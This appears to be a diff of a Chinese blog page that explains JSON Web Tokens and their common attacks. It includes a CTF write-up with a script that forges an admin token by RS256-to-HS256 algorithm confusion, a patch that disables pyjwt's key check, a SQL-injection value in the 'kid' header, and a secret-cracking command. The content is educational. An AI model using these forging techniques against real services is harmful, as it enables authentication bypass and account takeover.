@@ -87,38 +87,31 @@
 <p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在本地（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
 <p>无论何时用户想要访问受保护的路由或资源，用户代理都应使用承载方案发送JWT，通常在授权header中。header的内容应该如下所示：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>
-
 <p>这是一种无状态身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器受保护的路由将在授权头中检查有效的JWT，如果存在，则允许用户访问受保护的资源。由于JWT是独立的，所有必要的信息都在那里，减少了多次查询数据库的需求。</p>
 <p>这使我们可以完全依赖无状态的数据API，无论哪些域正在为API提供服务，因此跨源资源共享（CORS）不会成为问题，因为它不使用Cookie。</p>
 <p>Json Web Token结构<br>那么一般jwt长什么样子呢？</p>
 <p>我们随便挑一个看看：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-0TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure>
-
 <p>不妨解密一下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;adminsky&quot;</span>,<span class="string">&quot;priv&quot;</span>:<span class="string">&quot;other&quot;</span>&#125;乱码</span><br></pre></td></tr></table></figure>
-
 <p>不难看出，jwt解码后分为3个部分，由三个点（.）分隔</p>
 <p>分别为：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Header</span><br><span class="line">Payload</span><br><span class="line">Signature</span><br></pre></td></tr></table></figure>
-
 <p>Header<br>通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。</p>
 <p>正如json所显示</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>alg为算法的缩写，typ为类型的缩写</p>
 <p>然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。</p>
 <p>Payload<br>令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。</p>
 <p>这里是用户随意定义的数据</p>
 <p>例如上面的举例</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;adminsky&quot;</span>,</span><br><span class="line">    <span class="string">&quot;priv&quot;</span>:<span class="string">&quot;other&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。</p>
 <p>但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。</p>
 <p>Signature<br>要创建签名部分，必须采用header，payload，密钥</p>
 <p>然后利用header中指定算法进行签名</p>
 <p>例如HS256(HMAC SHA256),签名的构成为：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64Encode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64Encode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
-
 <p>然后将这部分base64编码形成JSON Web Token第三部分</p>
 <p>Json Web Token攻击手段<br>既然JWT作为一种身份验证的手段，那么必然存在伪造身份的恶意攻击，那么我们下面探讨一下常见的JWT攻击手段</p>
 <p>算法修改攻击<br>我们知道JWT的header部分中，有签名算法标识alg</p>
@@ -133,32 +126,27 @@
 <p>而对称加密只有一个key</p>
 <p>此时如果以pubkey作为key对数据进行篡改，则会非常简单，而如果后端的验证也是根据header的alg选择算法，那么显然正中下怀。</p>
 <p>下面以一道实战为例进行说明：</p>
-<p>拿到题目<a target="_blank" rel="noopener" href="http://pastebin.bxsteam.xyz/">http://pastebin.bxsteam.xyz</a></p>
+<p>拿到题目<a target="_blank" rel="noopener" href="http://pastebin.bxsteam.xyz">http://pastebin.bxsteam.xyz</a></p>
 <p>一开始不知道是要做什么，所以先查看源码</p>
 <p>发现<a target="_blank" rel="noopener" href="http://pastebin.bxsteam.xyz/static/js/common.js">http://pastebin.bxsteam.xyz/static/js/common.js</a></p>
 <p>其中几个点引人注目</p>
 <p>关注点1：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth = <span class="string">&quot;Bearer &quot;</span> + token;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;/list&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    headers:&#123;<span class="string">&quot;Authorization&quot;</span>:auth&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
 <p>存在web token</p>
 <p>关注点2:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>发现有一个存放公钥的目录</p>
 <p>所以立刻想到了json web token</p>
 <p>于是我抓包查看token</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-0TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure>
-
 <p>使用<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
 <p>得到3段：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;adminsky&quot;</span>,</span><br><span class="line">  <span class="string">&quot;priv&quot;</span>: <span class="string">&quot;other&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">signature</span><br></pre></td></tr></table></figure>
-
 <p>所以我的想法就是探测pubkey泄露，利用公私钥伪造json web token</p>
 <p>因为这个题的机制是私钥加密，公钥解密</p>
 <p>所以只要我们能拿到私钥，即可伪造json web token</p>
 <p>关注到格式</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>天真的我尝试了<br>md5(username)<br>md5(salt.username)<br>md5(username.salt)</p>
 <p>其中salt试了无数，例如Bearer,bxs,rebirth</p>
 <p>都没有成功，心态崩了，暂且搁置</p>
@@ -167,7 +155,6 @@
 <p>访问<br><a target="_blank" rel="noopener" href="http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e">http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e</a></p>
 <p>得到</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;pubkey&quot;</span>:<span class="string">&quot;-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCtRgwKdQFRKkXupJ8lHIXT/QTinmT9lobR6+1m4ubQXFaBlM7sJkzaoasPdU6e/5dJ5TelQSC59deolcXJ1iHf4/QmzndDX3L/ShtfPXZEGKkYCKC2kF0ekBz4W4LSQfaunZEz/yoScLqz9wOP8vwxAYN+P1nFtFrTzMdBYo8begEewIDAQABn-----END PUBLIC KEY-----&quot;</span>,<span class="string">&quot;result&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
-
 <p>解析公钥<br>key长度：    1024<br>模数：    AD460C0A7501512A45EEA49F251C85D3FD04E2993F65A1B47AFB59B8B9B41715A06533BB099336A86AC3DD53A7BFE5D2794DE950482E7D75EA257172758877F8FD09B37435F72FF4A1B5F3D764418A91808A0B6905D1E901CF85B82D241F6AE9D9133FF2A1270BAB3F7038FF2FC3101837E3F516D16B4F331D058A3C6DE8047B<br>指数：    65537 (0x10001)</p>
 <p>本想尝试分解，但发现1024bit的n基本无解，所以私钥是不可能获取了，这个时候我的思路其实被灭杀了。</p>
 <p>因为没有私钥基本不能篡改json web token，毕竟无法通过消息验证码校验</p>
@@ -181,37 +168,29 @@
 <p>此时即我们可以任意访问的pubkey</p>
 <p>故此我立刻写出了构造脚本</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">public</span> = open(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print jwt.encode(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;adminsky&quot;</span>,<span class="string">&quot;priv&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, key=<span class="keyword">public</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <p>注：1.txt为公钥</p>
 <p>priv为admin，因为之前为other，即其他人，同时只有admin可以读flag，所以这里猜测为admin</p>
 <p>运行发现报错：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;G:python2.7libsite-packagesjwtalgorithms.py&quot;</span>, line <span class="number">151</span>, in prepare_key</span><br><span class="line">    <span class="string">&#x27;The specified key is an asymmetric key or x509 certificate and&#x27;</span></span><br><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure>
-
 <p>发现源码的第151行爆破了，于是去跟踪库的源码</p>
 <p>发现</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">prepare_key</span><span class="params">(self, key)</span>:</span></span><br><span class="line"><span class="function">        key </span>= force_bytes(key)</span><br><span class="line"></span><br><span class="line">        invalid_strings = [</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN CERTIFICATE-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN RSA PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">if</span> <span class="title">any</span><span class="params">([string_value in key <span class="keyword">for</span> string_value in invalid_strings])</span>:</span></span><br><span class="line"><span class="function">            raise <span class="title">InvalidKeyError</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="string">&#x27;The specified key is an asymmetric key or x509 certificate and&#x27;</span></span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="string">&#x27; should not be used as an HMAC secret.&#x27;</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        return key</span></span><br></pre></td></tr></table></figure>
-
 <p>prepare_key会判断是否有非法字符，简单粗暴的注释掉<br>def prepare_key(self, key):<br>        key = force_bytes(key)<br>        return key</p>
 <p>保存后再运行得到</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2IjoiYWRtaW4ifQ.zc8m-ymnOrwuvd2kdsKMBVrT_9JXPXHkFf4vcPWecqI</span><br></pre></td></tr></table></figure>
-
 <p>然后利用这个去访问list</p>
 <p>即可得到admin的消息<br><img src="https://img-blog.csdnimg.cn/2019051621563087.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin:4fd5988f73c7a414f4c947e9fd708811</p>
 <p>访问<br><a target="_blank" rel="noopener" href="http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811">http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811</a></p>
 <p>得到flag</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;cumtctf&#123;jwt_is_not_safe_too_much&#125;&quot;</span>,<span class="string">&quot;result&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
-
 <p>至此，我们成功用修改算法攻击(非对称密码 =&gt; 对称密码)破解了此题</p>
 <p>密钥可控问题<br>题目1：</p>
 <p>在国赛中，我遇到了这样的JWT:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4MjAxIn0.eyJuYW1lIjoiYWRtaW4yMzMzIn0.aC0DlfB3pbeIqAQ18PaaTOPA5PSipJe651w7E0BZZRI</span><br><span class="line"></span><br><span class="line">header头：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;sha256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>:<span class="string">&quot;8201&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>其中kid为密钥key的编号id<br>类似逻辑为</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql=<span class="string">&quot;select * from table where kid=$kid&quot;</span></span><br></pre></td></tr></table></figure>
-
 <p>这样查询出来的值即为key的值<br>但是如果我们在这里进行恶意篡改，例如</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kid <span class="operator">=</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure>
-
 <p>这样查询出来的结果必然为12345</p>
 <p>这样等同于我们控制了密钥key</p>
 <p>拥有了密钥key，那么即可任意伪造消息，达到成为admin登入的目的了<br>题目2：</p>
@@ -219,7 +198,6 @@
 <p>这里的详情可以在最后的参考链接中查看，这里我简要叙述一下</p>
 <p>首先header中同样存在kid可控问题</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>:<span class="string">&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>并且题目存在写消息保存于本地的功能</p>
 <p>于是最后可以自己写公钥，保存于服务器</p>
 <p>利用kid可控的路径去加载自己写的公钥</p>
@@ -230,10 +208,9 @@
 <p>破解工具也有现成的：<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
 <p>使用方法：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>
-
 <p>即可得到密钥：Sn1f</p>
 <p>然后即可进行消息的恶意伪造，篡改</p>
-<p>参考链接<br><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e64d96b4a54d">https://www.jianshu.com/p/e64d96b4a54d</a><br><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a><br><a target="_blank" rel="noopener" href="https://delcoding.github.io/2018/03/jwt-bypass/">https://delcoding.github.io/2018/03/jwt-bypass/</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/dliv3/p/7450057.html">http://www.cnblogs.com/dliv3/p/7450057.html</a></p>
+<p>参考链接<br><a target="_blank" rel="noopener" href="https://jwt.io">https://jwt.io</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e64d96b4a54d">https://www.jianshu.com/p/e64d96b4a54d</a><br><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a><br><a target="_blank" rel="noopener" href="https://delcoding.github.io/2018/03/jwt-bypass/">https://delcoding.github.io/2018/03/jwt-bypass/</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/dliv3/p/7450057.html">http://www.cnblogs.com/dliv3/p/7450057.html</a></p>
 <p>转载自：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/145540">https://www.anquanke.com/post/id/145540</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
